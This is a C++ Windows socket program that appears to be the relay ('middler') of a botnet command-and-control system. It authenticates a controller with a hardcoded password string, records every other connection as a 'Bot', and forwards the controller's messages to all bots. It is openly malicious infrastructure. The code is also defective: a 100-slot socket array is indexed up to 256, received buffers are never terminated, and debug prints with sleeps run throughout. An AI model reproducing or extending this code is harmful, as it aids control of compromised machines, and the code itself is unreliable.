#include <iostream>
#include <WinSock2.h>
#include <string>
#include <cstring>

#pragma comment(lib, "ws2_32.lib")
#pragma warning(disable: 4996)

using namespace std;

SOCKET sock, sListen, Con[100];
SOCKADDR_IN addr;

HANDLE hThread, hThreadB, hThreadC;
DWORD IDThread;
DWORD WINAPI reconnect0(LPVOID d);
int s = sizeof(addr);

void Wsa()
{
	WSADATA wsaData;
	WORD DLLVersin = MAKEWORD(1, 2);
	WSAStartup(DLLVersin, &wsaData);

}

void setaddr()
{
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	addr.sin_port = htons(9901);
	addr.sin_family = AF_INET;
}

void listen()
{
	sListen = socket(AF_INET, SOCK_STREAM, NULL);
	bind(sListen, (SOCKADDR*)&addr, sizeof(addr));
	listen(sListen, SOMAXCONN);
}



DWORD WINAPI inff(LPVOID g)
{

	char msg[20] = " ";
	char msg2[40] = " ";
	string gg;
	int d = 0;
	while (true)
	{
		cout << "1" << endl;
		Sleep(1000);
		sock = accept(sListen, (SOCKADDR*)&addr, &s);
		cout << "2" << endl;
		Sleep(1000);
		recv(sock, msg2, sizeof(msg2), NULL);
		cout << msg << 3 << endl;
		Sleep(1000);
		//memcpy(gg, msg2, sizeof(msg2));
		gg = msg2;
		if (gg == "v86[wmxFBdX#5nb)rR@}MSzcu>ZC{j")
		{
			Con[0] = sock;
			cout << "4" << endl;
			Sleep(1000);
			cout << "Client connected" << endl;
		}
		else { Con[d] = sock; d++; cout << "Bot" << d << " connected to middler." << endl; cout << "5" << endl; Sleep(1000);
		}
		if (d == 256) { d = 1; }
	}

	return 0;
}

DWORD WINAPI reces(LPVOID d)
{
	int i = 1;
	string m;
t7:
	cout << "6" << endl;
	Sleep(1000);
	char msg[40] = "v86[wmxFBdX#5nb)rR@}MSzcu>ZC{j";
	cout << msg << 7 << endl;
	Sleep(1000);
	recv(Con[0], msg, sizeof(msg), NULL);
	cout << msg << 8 << endl;
	Sleep(1000);
	while (true)
	{	
		m = msg;
		cout << "9" << endl;
		Sleep(1000);
		if (m != "v86[wmxFBdX#5nb)rR@}MSzcu>ZC{j")
		{
			
			cout << "10" << endl;
			Sleep(1000);
			while (i <= 256)
			{
				cout << "11" << endl;
				Sleep(1000);
				send(Con[i], msg, sizeof(msg), NULL);
				cout << "12" << endl;
				Sleep(1000);
				closesocket(Con[i]);
				Sleep(1000);
				cout << "13" << endl;
				Sleep(1000);
				Sleep(1);
				cout << "14" << endl;
				Sleep(1000);
				i++;
				cout << "15" << endl;
				Sleep(1000);
			}	
			
			i = 1;
			cout << "16" << endl;
			Sleep(1000);
			cout << "sent" << endl;
			
			cout << m << endl;

		}
		goto t7;
	}
	return 0;
}



int main()
{
	setlocale(LC_ALL, "russian");


	Wsa();
	setaddr();
	listen();
	hThread = CreateThread(NULL, NULL, inff, NULL, NULL, &IDThread);
	hThreadB = CreateThread(NULL, NULL, reces, NULL, NULL, &IDThread);

	WaitForSingleObject(hThread, INFINITE);
	WaitForSingleObject(hThreadB, INFINITE);
	//WaitForSingleObject(hThreadC, INFINITE);


	return 0;
}